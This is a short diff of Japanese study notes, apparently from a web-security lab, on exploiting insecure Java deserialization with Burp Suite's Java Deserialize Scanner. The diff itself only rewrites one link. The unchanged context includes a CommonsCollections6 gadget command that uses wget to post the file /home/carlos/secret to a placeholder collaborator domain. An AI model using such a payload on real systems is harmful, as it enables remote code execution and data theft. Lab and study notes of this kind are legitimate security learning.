@@ -25,7 +25,7 @@
 1. オブジェクトを含むリクエストを右クリック-> Extensions -> Java Deserialize Scanner -> "Send request to DS -Exploitation"でリクエストを送る
 2. Set insertion Point: シリアライズ化されたオブジェクトに対してIntruderのように選択する
 3. Encoding: 対象のオブジェクトがエンコーディングされた順番通りにAdd -->する。
-	- [[⚡️Insecure deserialization#エンコーディング方式を明らかにする]]
+	- [⚡️Insecure deserialization](⚡️Insecure%20deserialization.md#エンコーディング方式を明らかにする)
 4. ライブラリとコマンドを入力する
 ```zsh
 CommonsCollections6 'wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret'
